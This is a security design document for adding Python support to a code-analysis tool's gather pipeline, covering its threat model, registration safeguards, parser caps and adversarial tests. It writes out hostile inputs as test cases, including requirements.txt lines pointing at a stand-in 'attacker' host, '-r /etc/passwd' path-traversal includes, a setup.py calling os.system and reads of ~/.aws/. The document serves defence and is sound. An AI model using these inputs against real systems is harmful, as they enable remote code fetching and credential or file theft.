# Phase 7.5 — Multi-language foundations + Python: Security-first design

**Lens:** Security — isolation, least privilege, audit, supply chain.
**Designed by:** Security-first design subagent
**Date:** 2026-05-20

## Lens summary

Phase 7.5 is, on the surface, an architecture-discipline phase — land the `LanguagePack` contract, retrofit TypeScript as pack #1, add Python as pack #2, ship `tests/conformance/`. Security-first, it is a **supply-chain expansion phase**: every capability a `LanguagePack` carries is a new piece of third-party code or a new attacker-controlled-input parser entering the deterministic gather closure. The threat model I assume is *the gather pipeline reading a hostile repository* — a `requirements.txt` engineered to trigger a network fetch or a code-exec during `gather`, a `poetry.lock` engineered to crash or mislead the dep-graph extractor, a malicious `LanguagePack` module landed via PR that fans poison into the kernel registries. I optimize for **two invariants the type system and the fence enforce, not the reviewer**: (1) *registration is total or it fails closed* — a partial `LanguagePack` cannot exist (`mypy --strict`), a semantically-broken capability cannot pass (`tests/conformance/`), and `register_language()` is all-or-nothing (no half-registered language ever reaches the coordinator); (2) *Python dep-graph extraction is pure parsing — never resolution* — reading `pyproject.toml` / `requirements.txt` / `poetry.lock` / `Pipfile.lock` / `uv.lock` performs zero network I/O and zero subprocess spawn against attacker-named binaries, enforced by the existing `fence` + `import-linter` and a new dep-graph-purity fence. I deprioritize: dep-graph *completeness* on adversarial inputs (a `requirements.txt` with a VCS URL or `-e .` is recorded as an *unresolved-with-reason* fact, not chased), the ergonomics of authoring a `LanguagePack` (the contract is deliberately rigid and total — no optional capability slots), and onboarding speed for the `scip-python` adapter (it ships behind a degrade-to-tree-sitter ladder, and is allowed to report `confidence = Unavailable` rather than be made convenient).

## Threat model

### Assets to protect

- **The deterministic gather closure.** The single most valuable property of `codegenie/` is that it has no LLM and no network at gather time, locked by `tests/unit/test_pyproject_fence.py` + `import-linter`. Adding Python pulls `tree-sitter-python` (a C-extension wheel) and `scip-python` (a separate binary) into the runtime/declared closure. Each is new third-party code that must not be allowed to (a) reach the network during `gather`, (b) widen `FORBIDDEN_LLM_SDKS`-adjacent surface, or (c) execute code from the analyzed repo.
- **The kernel registries.** `@register_probe`, `@register_dep_graph_strategy`, the grammar kernel `_DISPATCH`. `register_language()` is a *new privileged write path* into all three at once. A registry corrupted at import time (a duplicate key silently overwriting Node's strategy, a `LanguagePack` registering a probe under an existing Node probe's name) is a silent compromise of every Node workflow — the textbook "extension by addition broke the thing it must not edit" failure.
- **The `ALLOWED_BINARIES` frozenset.** A closed allowlist (`src/codegenie/exec/__init__.py:105`). Python introduces candidate new binaries (`scip-python`, possibly `tree-sitter` already present, and *not* `pip`/`poetry`/`uv` — see below). Every addition is supply-chain surface and is governed by 02-ADR-0001's ADR-amendment rule.
- **The `.codegenie/` audit chain.** The dispatch-order event and per-probe outputs must record *which `LanguagePack` produced which slice* so a later compromise is attributable. An unattributable Python slice is an audit gap.
- **The conformance + golden suite as a safety net.** ADR-0043's sanctioned *migration* path leans on `tests/conformance/` and `tests/golden/languages/` being trustworthy. If a golden can be silently regenerated, the migration path becomes a silent-edit laundering channel.
- **The TypeScript/JavaScript regression suite.** ~2,300 existing tests. Their staying green is the *evidence* that Python was added by addition. Anything that lets Python's introduction perturb that suite destroys the proof.

### Adversaries assumed

1. **A hostile target repository.** The repo being gathered is attacker-controlled. Its `pyproject.toml`, `requirements.txt`, `poetry.lock`, `Pipfile.lock`, `uv.lock`, `setup.py`, `setup.cfg`, `.python-version`, and every `*.py` file are adversarial input. The headline attacks: a `requirements.txt` line `-e git+https://attacker/evil#egg=x` or `--index-url http://attacker/` or `-r /etc/shadow` or `-r ../../../../etc/passwd`; a `setup.py` that is arbitrary Python (running it is RCE); a `poetry.lock` / `uv.lock` with a billion-laughs-style nested structure, a 2 GB file, or `package @ file:///etc/...` source URLs; a `*.py` file crafted to crash or hang `tree-sitter-python` or `scip-python`.
2. **A malicious `LanguagePack` landed via PR.** A `LanguagePack` is *trusted code loaded at import time*. An outside or compromised contributor lands `python_pack.py` that, on import, reads `~/.aws/`, or registers a `register_dep_graph_strategy("npm")` that shadows Node's, or supplies a project-detector that returns `True` for every repo (hijacking Node repos into the Python path).
3. **A poisoned `tree-sitter-python` / `scip-python` upstream.** A typosquatted or compromised wheel/binary version. The `tree-sitter-python` wheel ships a compiled `.so`; a malicious build runs attacker code the moment the grammar is loaded.
4. **A silent-edit attacker exploiting the discipline reframe.** ADR-0043 newly *sanctions* editing frozen surfaces via the "migration" path. An attacker frames a behavior-changing edit (loosen a sanitizer, flip a default) as a "migration", regenerating goldens to match, so the regression suite stays green and hides the change.
5. **Prompt-injection-shaped content in repo files.** Phase 7.5 has no LLM, but Python file content, package names, and lockfile strings flow into the audit log and (later, Phase 8+) into LLM-facing bundles. Zero-width chars, ANSI/bidi unicode, oversized fields must be neutralized before they reach any human- or model-facing surface.

### Attack surfaces specific to this phase

| # | Surface | Why it's new in 7.5 |
|---|---|---|
| 1 | `tree-sitter-python` wheel | New C-extension in the runtime closure; loads a compiled `.so`. |
| 2 | `scip-python` binary | New external binary; pyright-based, large, network-capable by nature. |
| 3 | Python lockfile/manifest parsers (`pyproject.toml`, `requirements.txt`, `poetry.lock`, `Pipfile.lock`, `uv.lock`, `setup.py`/`setup.cfg`) | Six new attacker-controlled-input parsing surfaces. `requirements.txt` is the worst — it is a *directive language*, not just data. |
| 4 | `register_language()` | New privileged multi-registry write path. |
| 5 | The `LanguagePack` module load | New trusted-code import surface; a pack is Python executed at startup. |
| 6 | `tests/conformance/` golden regeneration | New safety-net surface; if forgeable, it launders silent edits. |
| 7 | Python dep-graph strategies (pip/poetry/uv) registered into `@register_dep_graph_strategy` | New strategy code reachable by the coordinator. |

### Trust boundaries

```
  ┌─ TB-1 ── The deterministic gather closure (no LLM, no net) ─────────────┐
  │                                                                          │
  │   ┌─ TB-2 ── Attacker-controlled repo input ──────────────────────────┐ │
  │   │  pyproject.toml · requirements.txt · poetry.lock · Pipfile.lock    │ │
  │   │  uv.lock · setup.py · *.py source files                           │ │
  │   └────────────────────────────────────────────────────────────────────┘ │
  │     crossing TB-2: parse-only, byte-capped, no eval, no net, no subproc   │
  │                                                                          │
  │   ┌─ TB-3 ── Trusted-code: the LanguagePack module ────────────────────┐ │
  │   │  python_pack.py — loaded at import; fans into kernel registries     │ │
  │   └────────────────────────────────────────────────────────────────────┘ │
  │     crossing TB-3: register_language() — total, idempotent, fail-closed  │
  │                                                                          │
  │   ┌─ TB-4 ── External binary surface ──────────────────────────────────┐ │
  │   │  scip-python (precision adapter) — ALLOWED_BINARIES-gated           │ │
  │   │  tree-sitter-python wheel — pinned + hashed, loaded by grammar kern │ │
  │   └────────────────────────────────────────────────────────────────────┘ │
  │     crossing TB-4: run_external_cli only; jailed; confidence-degradable │
  └──────────────────────────────────────────────────────────────────────────┘

  No credentials cross any boundary in Phase 7.5. The gather pipeline holds none.
  (Phase 11 introduces git/PR credentials; this phase must not pre-leak a path to them.)
```

The only mutable-state crossing in the phase is **TB-3: `register_language()` writing the kernel registries.** Everything else is read-only parsing (TB-2) or read-only structural indexing (TB-4).

## Goals (concrete, measurable)

1. **Total registration.** An incomplete `LanguagePack(...)` fails `mypy --strict` (compile-time). `register_language()` is all-or-nothing: it validates the whole pack, then commits to all three registries inside one operation; any failure rolls back and raises — *no* registry is left half-written. Verified by a test that injects a pack whose 4th capability raises and asserts the first three registries are untouched.
2. **No-shadow guarantee.** `register_language()` rejects any pack that would overwrite an already-registered probe name, dep-graph `PackageManager`, or grammar `_DISPATCH` key. A `LanguagePack` that collides with TypeScript's registrations fails loudly at registration, never silently wins. Verified by an adversarial test registering a pack that re-uses a Node probe name.
3. **Dep-graph parsing is pure.** Python dep-graph extraction performs **zero** network calls and **zero** subprocess spawns. Enforced by (a) the existing `fence` (no LLM/net SDKs), (b) `import-linter` (the `depgraph` package may not import `urllib`/`requests`/`socket`/`subprocess`), and (c) a new `tests/fence/test_depgraph_purity.py` AST-walking fence over `src/codegenie/depgraph/strategies/python/`. Verified against an adversarial `requirements.txt` carrying `-e .`, a VCS URL, `--index-url`, and an `-r /etc/passwd` — the run completes, fetches nothing, executes nothing.
4. **`setup.py` is never executed.** `setup.py` / `setup.cfg` are read as *text* and parsed structurally (tree-sitter for `setup.py`, INI for `setup.cfg`); `exec()`/`importlib` against repo files is forbidden by the `forbidden-patterns` hook and a probe-level AST test. A repo whose only manifest is a hostile `setup.py` yields a `confidence=low` "unresolved: setup.py not statically analyzable" fact — never an RCE.
5. **Input hard caps.** Every Python manifest/lockfile parser enforces a byte cap (default 5 MiB), a parse-depth/entry cap, and a wall-clock timeout, before parsing. An oversized or billion-laughs lockfile is *rejected with a structured warning*, not OOM/hang. Verified by adversarial fixtures.
6. **Pinned + hashed third-party code.** `tree-sitter-python` and `scip-python` are pinned to exact versions with hashes in `uv.lock`; the `pyproject.toml` fence test is extended to assert the Python grammar wheel is present *and* that no new forbidden SDK rode in with it. Verified by `make fence`.
7. **`ALLOWED_BINARIES` minimal.** `pip`, `poetry`, `uv` are **not** added to `ALLOWED_BINARIES` — Phase 7.5 never invokes them. Only `scip-python` is a candidate addition, under a 02-ADR-0001 amendment, and only because the SCIP adapter genuinely needs it. Verified by the closed-set regression test.
8. **Conformance catches semantic breakage.** A `LanguagePack` whose search adapter is a stub that type-checks but returns wrong/empty results fails `tests/conformance/`. Verified by a planted-stub negative test.
9. **No regression-suite perturbation.** The full Phase 1–7 TS/JS suite runs unchanged and green. Verified in CI as a hard gate.
10. **Silent-edit fence.** The category-based extension-by-addition fence rejects a planted silent edit (a changed function body in a Node probe) while accepting a sanctioned additive `Literal` member. Verified by a planted-edit test in `tests/fence/`.

## Architecture

```
                         TB-1 : deterministic gather closure (no LLM / no net)
 ┌──────────────────────────────────────────────────────────────────────────────┐
 │                                                                                │
 │   register_language(pack: LanguagePack)   ◀── TB-3 (trusted-code import)        │
 │        │                                                                       │
 │        │  1. validate_pack()  — totality + no-shadow + adapter-import resolve   │
 │        │  2. stage all 4 registry writes                                       │
 │        │  3. commit-all  OR  rollback-all  (fail-closed)                        │
 │        ▼                                                                       │
 │   ┌─────────────┐   ┌──────────────────────┐   ┌────────────────────────┐      │
 │   │ probe       │   │ dep-graph strategy   │   │ grammar kernel _DISPATCH│      │
 │   │ registry    │   │ registry             │   │  (tree-sitter)          │      │
 │   └─────────────┘   └──────────────────────┘   └────────────────────────┘      │
 │        ▲                    ▲                          ▲                       │
 │        │                    │                          │                      │
 │   LanguagePack #1 = TypeScript (retrofit)   LanguagePack #2 = Python (new)      │
 │        capabilities:  grammar · project-detector · Layer-A probes ·             │
 │                       package-managers · dep-graph-strategies · search-adapter  │
 │                                                                                │
 │   ┌───────────────────────── coordinator ───────────────────────────────┐      │
 │   │  reads registries · partitions waves · failure-isolates per probe    │      │
 │   └──────────────────────────────────────────────────────────────────────┘     │
 │        │                                                                       │
 │        ▼  TB-2 crossing : every probe reads attacker-controlled repo bytes      │
 │   ┌─────────────────────────────────────────────────────────────────────┐      │
 │   │ Python Layer A/B probes · Python dep-graph parsers                   │      │
 │   │   parse-only · byte-capped · timeout-bounded · NO eval · NO net      │      │
 │   └─────────────────────────────────────────────────────────────────────┘      │
 │        │                                                                       │
 │        ▼  TB-4 crossing : optional, jailed, degradable                          │
 │   ┌─────────────────────────────────────────────────────────────────────┐      │
 │   │ scip-python adapter  →  run_external_cli (ALLOWED_BINARIES, jailed)  │      │
 │   │   confidence: Trusted | Degraded | Unavailable  → tree-sitter fallbk │      │
 │   └─────────────────────────────────────────────────────────────────────┘      │
 │        │                                                                       │
 │        ▼  two-pass sanitizer (schema + path-scrub + secret-shape reject)        │
 │   .codegenie/context/  — each slice tagged with producing LanguagePack id       │
 └────────────────────────────────────────────────────────────────────────────────┘

 Credential flows: NONE. The gather pipeline holds no tokens, keys, or secrets in
 this phase. The design's job is to keep it that way — no Python capability may
 open a path (network egress, subprocess to a fetcher) that a later phase's
 credentials could travel down.
```

## Components

### `LanguagePack` contract

- **Purpose:** A total, frozen value type with exactly one required field per capability a language must supply: `grammar`, `project_detector`, `layer_a_probes`, `package_managers`, `dep_graph_strategies`, `search_adapter`. The single sanctioned shared-file surface for the language axis.
- **Trust level:** Trusted-code definition; instances are *constructed in trusted code* (a pack module), never from external data.
- **Interface:** `@dataclass(frozen=True)` (or Pydantic frozen model) — no `Optional` fields, no `= None` defaults, no `**kwargs`. Every capability is mandatory and typed. There is no "partial pack" constructor. Adversarial input never reaches a `LanguagePack` constructor — packs are authored, not parsed.
- **Isolation:** The type *is* the isolation. `make-illegal-states-unrepresentable`: a half-configured language cannot be expressed. `mypy --strict` rejects an incomplete `LanguagePack(...)` at compile time — this is the primary control, not a runtime check.
- **Credentials accessed:** None.
- **Audit emissions:** None directly; its `language_id` is stamped onto every slice its capabilities produce.
- **Tradeoffs accepted:** Rigidity. Adding a genuinely new capability category grows the `LanguagePack` type and breaks *every* existing pack until updated — this is the *desired* behavior (compiler-policed, ADR-0043-sanctioned loud edit), but it does mean the contract cannot be "extended quietly." Authoring a pack is deliberately heavy; convenience is sacrificed for totality.

### `register_language()` — the privileged registration path

- **Purpose:** Fan one validated `LanguagePack` out into the existing decomposed registries (`@register_probe`, `@register_dep_graph_strategy`, grammar `_DISPATCH`).
- **Trust level:** Privileged kernel operation. This is the only mutable-state write across a trust boundary in the phase.
- **Interface:** `register_language(pack: LanguagePack) -> None`. Input is a typed, trusted `LanguagePack` — not external data — so the interface itself carries no adversarial input. The adversarial concern is a *malicious pack module*, addressed by validation + no-shadow, not by input sanitization.
- **Isolation:** Two-phase commit. Phase 1 — `validate_pack()`: assert totality (every capability present and structurally well-formed), resolve every adapter import path (broken import surfaces here, never at workflow time — mirrors ADR-0031's plugin-load fast-fail), and run the **no-shadow check** (no probe name / `PackageManager` key / grammar key already claimed by another pack). Phase 2 — stage all writes, then commit-all or rollback-all. A pack that fails any check leaves *every* registry byte-identical to before. Registration is **idempotent**: registering the same pack twice is a no-op, not a double-write (defends against an import-order quirk re-running registration).
- **Credentials accessed:** None.
- **Audit emissions:** `language.registered{language_id, capability_count, probe_names, package_managers, grammar_keys}` and, on rejection, `language.registration_rejected{language_id, reason, conflicting_key?}` — a fail-closed event so a rejected registration is *visible*, never silent.
- **Tradeoffs accepted:** Two-phase commit is more code than a naive "loop and register". Worth it: a half-registered language is a silent corruption of the kernel that no test downstream would obviously catch. Default-deny on name collision means a legitimate intentional override (should never happen for a *language* — languages are disjoint) would require an explicit, ADR-noted mechanism; we accept that friction because a silent shadow of a Node probe is exactly the catastrophe extension-by-addition exists to prevent.

### Python project detector

- **Purpose:** Decide whether a repo is a Python project (presence of `pyproject.toml`, `setup.py`, `setup.cfg`, `requirements*.txt`, `Pipfile`, or a populated `*.py` tree).
- **Trust level:** Untrusted-input boundary (TB-2).
- **Interface:** Reads repo file *names and presence*, and parses small marker files. Adversarial input: a repo that plants `pyproject.toml` to mis-route a Node repo into the Python path, or an empty `pyproject.toml` to trigger a crash.
- **Isolation:** Pure function over a `RepoSnapshot`; no execution, no globbing outside the snapshot root. Detection is *additive* — a polyglot repo is detected as *both* Node and Python; the detector never *removes* the Node verdict. This means a planted `pyproject.toml` cannot *demote* a Node repo, only *add* a (correct, if the repo really has Python) Python verdict.
- **Credentials accessed:** None.
- **Audit emissions:** `language.detected{language_id, markers_found}`.
- **Tradeoffs accepted:** Over-detection (flagging a repo with one stray `.py` script as "Python") is preferred to under-detection. Over-detection costs a few wasted probe runs; under-detection silently skips analysis — the worse failure.

### Python Layer A/B probes

- **Purpose:** Language detection, build-system, manifest, CI, deployment, test-inventory analogs for Python — facts, not judgments.
- **Trust level:** Untrusted-input boundary (TB-2). Every probe reads attacker-controlled bytes.
- **Interface:** The frozen `Probe` ABC (`src/codegenie/probes/base.py`) — unchanged, *consumed* not edited (ADR-0007 / ADR-0043). `declared_inputs` are Python globs (`pyproject.toml`, `requirements*.txt`, `**/*.py`, etc.). Adversarial inputs: oversized files, deeply nested TOML, files with embedded null bytes / bidi unicode, symlinks pointing outside the repo root.
- **Isolation:** Functional core / imperative shell — pure parsing helpers; `run()` is the only impure surface and it only *reads*. Hard caps before parse: byte cap, entry/depth cap, per-probe `timeout_seconds`. Symlinks are resolved and rejected if they escape the snapshot root. No probe spawns a subprocess against `pip`/`poetry`/`uv`.
- **Credentials accessed:** None.
- **Audit emissions:** Standard per-probe output with `confidence`, plus a `_WARNING_IDS` set including `python.manifest_oversized`, `python.lockfile_truncated`, `python.setup_py_not_static`.
- **Tradeoffs accepted:** A probe that hits a cap returns a *partial fact with `confidence=low` and a warning ID* rather than a complete answer. Honest-confidence over completeness — the load-bearing commitment.

### Python dep-graph strategies (pip / poetry / uv)

- **Purpose:** Implement `dep_graph.consumers`-class extraction for the three Python package managers by parsing `requirements.txt` / `poetry.lock` / `uv.lock` / `Pipfile.lock`.
- **Trust level:** Untrusted-input boundary (TB-2) — the highest-risk parsers in the phase.
- **Interface:** Registered via `@register_dep_graph_strategy(PackageManager)`. **`requirements.txt` is parsed as a directive language and every non-pinned-dependency directive is recorded as a fact, never acted on:** `-e .` / `-e <path>` → `unresolved: editable install`; `git+...` / VCS URLs → `unresolved: vcs source`; `--index-url` / `--extra-index-url` → recorded as `index_override_present` (a *security-relevant fact* a later stage may flag) and otherwise ignored — **the parser never honors an index URL**; `-r <path>` includes are followed *only* if the path resolves inside the repo root, otherwise `unresolved: out-of-tree include`.
- **Isolation:** Pure parsing. Enforced by `import-linter` (the Python depgraph package may not import `urllib`/`requests`/`http`/`socket`/`subprocess`) **and** a dedicated `tests/fence/test_depgraph_purity.py` AST fence. `poetry.lock` / `uv.lock` / `Pipfile.lock` are TOML/JSON — parsed with byte+depth caps. No package-manager binary is invoked; no network is touched.
- **Credentials accessed:** None.
- **Audit emissions:** `depgraph.python.unresolved{reason, count}`, `depgraph.python.index_override_present{url_host}` (host only — full URL is attacker-controlled and not echoed verbatim).
- **Tradeoffs accepted:** **Dep-graph completeness on adversarial inputs is explicitly sacrificed.** A repo using only VCS deps or editable installs yields a near-empty graph with `confidence=low` and explicit unresolved-reasons. Chasing those would mean network resolution at gather time — a hard no. An honest "I couldn't resolve this and here's why" is correct; a complete graph obtained by fetching attacker URLs is a compromise.

### Python search adapter (`scip-python` + tree-sitter fallback)

- **Purpose:** Implement the ADR-0032 search-adapter Protocols (`ScipAdapter`, `ImportGraphAdapter`, `TestInventoryAdapter`, `DepGraphAdapter`) for Python.
- **Trust level:** TB-4 — the `scip-python` binary is external, large, pyright-based, and network-capable by nature.
- **Interface:** Generic ADR-0032 Protocols. The `scip-python` invocation runs over the attacker-controlled repo.
- **Isolation:** `scip-python` is invoked **only** through `run_external_cli` (the Phase 2 jailed wrapper), with: explicit deny-all network egress (`allowlisted_egress = frozenset()`), a tmpdir workspace, a wall-clock timeout, and a sanitized `env` (the `_SENSITIVE_EXACT` / `_SENSITIVE_PREFIX` scrub already strips `GITHUB_TOKEN`, `AWS_*`, etc.). It runs as the lowest-privilege capability and is **degradable**: `confidence()` returns the ADR-0033 sum type `Trusted | Degraded | Unavailable`. If `scip-python` is missing, errors, or times out → `Unavailable` → the dispatcher falls back to the always-fresh tree-sitter `ImportGraphAdapter`. A broken or hostile `scip-python` *degrades precision*; it never blocks or compromises the gather.
- **Credentials accessed:** None — and `run_external_cli` actively strips any that exist in the environment.
- **Audit emissions:** `adapter.python.confidence{kind}`, `adapter.python.degraded{from, to, reason}` — every downgrade is logged, never silent (the ADR-0032 / ADR-0030 discipline: a low-confidence answer is *announced*).
- **Tradeoffs accepted:** `scip-python` onboarding ergonomics are deprioritized — it ships behind the degrade ladder and is allowed to be `Unavailable` in environments that don't have it. The phase's correctness does not depend on SCIP precision; tree-sitter is the floor.

### `tests/conformance/` tier

- **Purpose:** A parameterized suite every registered `LanguagePack` is auto-enrolled in — catches "capability slot filled but semantically broken."
- **Trust level:** Trusted test infrastructure; the integrity-anchor for ADR-0043's migration path.
- **Interface:** Each language ships a mandatory fixture repo + golden under `tests/golden/languages/{language}/`. The suite drives a full gather over the fixture and asserts the golden.
- **Isolation:** Conformance runs the gather pipeline against *committed, reviewed fixture repos* — not arbitrary input. Crucially, it **also includes adversarial fixtures** (a hostile `requirements.txt`, an oversized lockfile, a hostile `setup.py`) as first-class conformance cases, so "fails closed on hostile input" is part of *passing* conformance, not an afterthought.
- **Credentials accessed:** None.
- **Audit emissions:** Test artifacts only.
- **Tradeoffs accepted:** Golden regeneration is a *deliberate, reviewed* act (ADR-0043's migration discipline). To stop golden-regeneration from laundering silent edits, golden files are covered by the repo's existing dirty-tree guard (the goldens-not-dirtied protection from `ac1b5c5`); a migration that regenerates goldens is a labeled, reviewed sweep — never a quiet `--update-goldens` in an unrelated PR.

## Data flow

A representative end-to-end run: `codegenie gather ./hostile-python-repo` where the repo contains a `pyproject.toml`, a `requirements.txt` with `-e .`, a `git+https://attacker/...` line, a `--index-url http://attacker/`, a 200 MB `poetry.lock`, and a `setup.py` that calls `os.system(...)`.

1. **Startup — `register_language()` runs for both packs.** The TypeScript pack and the Python pack each call `register_language()`. **[TB-3 crossing]** Each pack is validated: totality holds, every adapter import path resolves, the no-shadow check passes (Python's probe names, `PackageManager` keys `{pip, poetry, uv}`, and grammar key `python` collide with nothing TypeScript claimed). Both commit atomically. `language.registered` events fire. If the Python pack module had tried to register a probe named like a Node probe, registration would have raised `language.registration_rejected` here — *before any repo is read* — and `gather` would refuse to start.
2. **Project detection.** **[TB-2 crossing]** The Python project detector sees `pyproject.toml` + `setup.py` + `requirements.txt` → `language.detected{python, [pyproject.toml, setup.py, requirements.txt]}`. Additive: had the repo also had `package.json`, Node would be detected too.
3. **Coordinator partitions waves.** It reads the registries (now containing both languages' probes) and dispatches Python Layer A/B probes under the existing bounded semaphore, with per-probe failure isolation.
4. **Manifest probe reads `pyproject.toml`.** **[TB-2 crossing]** Byte cap (5 MiB) checked first — passes. TOML parsed with a depth cap. Facts recorded.
5. **Dep-graph strategy parses `requirements.txt`.** **[TB-2 crossing]** Parsed as a directive language: `-e .` → `unresolved: editable install`; `git+https://attacker/...` → `unresolved: vcs source`; `--index-url http://attacker/` → `index_override_present{url_host: "attacker"}` and **otherwise ignored — no fetch**. Result: a near-empty dep graph with `confidence=low` and explicit unresolved-reasons. **No network call. No subprocess.** The `tests/fence/test_depgraph_purity.py` fence is the structural proof this is impossible to violate.
6. **`poetry.lock` (200 MB) hits the byte cap.** The parser rejects it *before parsing* with warning ID `python.lockfile_truncated` (or `python.manifest_oversized`), `confidence=low`. No OOM, no hang.
7. **`setup.py` is read as text only.** The build-system probe parses it structurally with tree-sitter; the `os.system(...)` call is *observed as a fact* ("setup.py contains a dynamic call; not statically resolvable") with `confidence=low`. **`setup.py` is never executed** — the `forbidden-patterns` hook and a probe AST test make `exec()`/`importlib` of repo files unrepresentable.
8. **Search adapter — `scip-python`.** **[TB-4 crossing]** Invoked via `run_external_cli`: deny-all egress, tmpdir workspace, env scrubbed of `GITHUB_TOKEN`/`AWS_*`, timeout. If the hostile `*.py` files crash `scip-python` → it returns non-zero / times out → `confidence() = Unavailable` → `adapter.python.degraded{scip → tree_sitter}` → tree-sitter `ImportGraphAdapter` answers instead. Precision degrades; the gather completes.
9. **Sanitizer + writer.** Every Python slice flows through the two-pass sanitizer: schema validation, absolute-path scrub, secret-shape rejection. Bidi/zero-width unicode and ANSI escapes in package names / file content are neutralized before they reach the human-facing `repo-context.yaml`. Each slice is tagged with `language_id: python`.
10. **Audit anchors written.** The dispatch-order event, the `language.registered` / `language.detected` events, every `unresolved` / `index_override_present` / `degraded` event land in `.codegenie/context/runs/*.json` — a complete, attributable trail. An auditor can later see exactly which `LanguagePack` produced which slice and that no network was touched.

The run **completes** — with honest low-confidence facts and explicit unresolved-reasons — having fetched nothing, executed nothing from the repo, and corrupted no registry.

## Failure modes & recovery

| Failure | Detected by | Containment | Recovery |
|---|---|---|---|
| `LanguagePack` constructed incomplete | `mypy --strict` at compile time | Build fails — code never ships | Author supplies the missing capability |
| `register_language()` 4th write fails mid-fan-out | Two-phase commit; staged-write exception | Rollback-all — every registry byte-identical to pre-call; `language.registration_rejected` event | `gather` refuses to start; operator fixes the pack |
| Malicious pack registers a probe shadowing a Node probe | No-shadow check in `validate_pack()` | Registration raises before any commit; `language.registration_rejected{conflicting_key}` | PR is blocked; collision is named in the event |
| Malicious `LanguagePack` module reads `~/.aws/` at import | Not auto-detected — **acknowledged gap** (see blind spots) | `import-linter` forbids `depgraph`/`probes` packages from importing `os.path.expanduser`-adjacent surfaces in the *new* Python pack modules; PR review of any new pack | Pack import is reviewed code; the `import-linter` contract is the structural backstop, review is the human one |
| Poisoned `tree-sitter-python` / `scip-python` upstream | `uv.lock` hash mismatch on install; `make fence` asserts pinned versions | Install fails on hash mismatch; CI red | Pin bump is a reviewed, hash-updating PR |
| `requirements.txt` with VCS URL / `--index-url` / `-r /etc/passwd` | Dep-graph parser's directive classifier; `-r` path-escape check | Recorded as `unresolved` / `index_override_present`; out-of-tree `-r` rejected; **no fetch, no read outside repo** | Graph is partial with `confidence=low`; downstream sees explicit reasons |
| Hostile `setup.py` (arbitrary Python) | `forbidden-patterns` hook + probe AST test forbidding `exec`/`importlib` of repo files | `setup.py` read as text only; never executed | `confidence=low` fact "setup.py not statically analyzable" |
| 200 MB / billion-laughs lockfile | Byte cap + depth cap *before* parse | Parser rejects; `python.manifest_oversized` warning | Partial result, `confidence=low`; no OOM/hang |
| `*.py` crafted to crash/hang `scip-python` | `run_external_cli` timeout + non-zero exit | `scip-python` killed at timeout (SIGTERM→SIGKILL); jailed — no escape, no egress | `confidence()=Unavailable` → tree-sitter fallback; gather completes |
| Bidi/zero-width/ANSI injection in package names or `*.py` content | Two-pass sanitizer | Neutralized before reaching `repo-context.yaml` or any reviewer surface | Sanitized output written; raw retained only in machine-read raw JSON |
| Silent edit framed as a "migration" (loosened sanitizer) | Category-based extension-by-addition fence + conformance suite (incl. adversarial fixtures) + golden dirty-tree guard | Planted-edit fence test fails; adversarial conformance fixture fails if the sanitizer weakened | Migration PR is rejected; the change must be loud and justified |
| Python's introduction perturbs the TS/JS suite | Full Phase 1–7 regression suite as a hard CI gate | Any perturbation → CI red | The "added by addition" claim is falsified; fix before merge |

## Resource & cost profile

- **New runtime closure additions:** `tree-sitter-python` (one C-extension wheel, ~1–3 MB) + `scip-python` (external binary, not in the Python package — installed separately, gated by `ALLOWED_BINARIES`). No new runtime *services*.
- **`scip-python` cold cost:** single-digit seconds per repo for a hot query (consistent with ADR-0030's SCIP cost band). Behind the degrade ladder, so it is *optional* spend — environments without it pay nothing and lose only precision.
- **Cost of security — concrete:**
  - *Byte/depth caps + timeouts:* negligible CPU (a length check before parse). Cost is *correctness given up* — a legitimately huge monorepo lockfile may be truncated. Accepted: honest-low-confidence beats OOM.
  - *Two-phase commit in `register_language()`:* a few hundred microseconds at startup, twice (two packs). Immeasurable at runtime.
  - *Deny-all egress + env scrub for `scip-python`:* zero added latency; it is policy on an already-jailed wrapper.
  - *Adversarial conformance fixtures:* ~5–10 extra fixture repos and goldens, a few seconds of CI. Cheap.
  - *`tests/fence/test_depgraph_purity.py` AST walk:* milliseconds; runs every PR.
- **The expensive line item is human:** authoring a *total* `LanguagePack` (six mandatory capabilities, all conformance-passing including adversarial) is deliberately more work than a partial one. That is the cost of "a half-registered language cannot exist." Accepted.

## Test plan

**Unit / contract**
- `LanguagePack` totality: an incomplete `LanguagePack(...)` is a `mypy --strict` failure (compile-time assertion test).
- `register_language()` two-phase commit: inject a pack whose 4th capability registration raises → assert all three registries byte-identical to pre-call.
- `register_language()` idempotence: register the same pack twice → no double-write.
- No-shadow: register a pack re-using a Node probe name / `PackageManager` key / grammar key → `language.registration_rejected` raised, registries untouched.
- Project-detector additivity: a polyglot fixture is detected as *both* Node and Python; a planted `pyproject.toml` in a Node-only repo does not *demote* Node.

**Adversarial (the load-bearing tests)**
- `requirements.txt` carrying `-e .`, `git+https://...`, `--index-url http://attacker/`, `--extra-index-url`, `-r /etc/passwd`, `-r ../../../etc/passwd` → parser completes, **network monitor asserts zero outbound connections**, subprocess monitor asserts zero spawns, out-of-tree `-r` rejected, results carry explicit `unresolved` reasons.
- Hostile `setup.py` (`os.system`, `subprocess`, `__import__`) → read as text, never executed; `confidence=low`; AST test asserts no `exec`/`eval`/`importlib`-of-repo-file in the Python probe code.
- Oversized (`>5 MiB`) and billion-laughs `poetry.lock` / `uv.lock` / `Pipfile.lock` → rejected before parse, `python.manifest_oversized` warning, no OOM/hang (timeout-bounded test).
- Symlink in the repo pointing outside the snapshot root → resolved and rejected; no read outside root.
- Bidi/zero-width/ANSI-escape injection in package names and `*.py` content → sanitizer neutralizes before `repo-context.yaml`.
- `*.py` files crafted to crash/hang `scip-python` → adapter degrades to `Unavailable`, tree-sitter fallback answers, gather completes; the jailed process is killed at timeout with no egress.

**Fence / structural**
- `tests/fence/test_depgraph_purity.py`: AST-walk over `src/codegenie/depgraph/strategies/python/` asserting no `urllib`/`requests`/`http`/`socket`/`subprocess` import and no network/exec call.
- `make fence` extended: `tree-sitter-python` wheel present *and* no new `FORBIDDEN_LLM_SDK` rode in; `import-linter` contracts updated for the Python sub-packages.
- `ALLOWED_BINARIES` closed-set regression: `pip`/`poetry`/`uv` are *not* present; only the sanctioned additions are.
- Category-based extension-by-addition fence: a planted silent edit (changed function body in a Node probe) fails; a sanctioned additive `Literal` member passes.

**Conformance**
- Every registered `LanguagePack` auto-enrolled; Python and TypeScript both pass against their `tests/golden/languages/{language}/` goldens.
- Planted-stub negative test: a `LanguagePack` whose search adapter type-checks but returns empty/wrong results **fails** conformance.
- Adversarial conformance fixtures (hostile `requirements.txt`, oversized lockfile, hostile `setup.py`) are part of *passing* conformance — fail-closed behavior is conformance-verified.

**Regression**
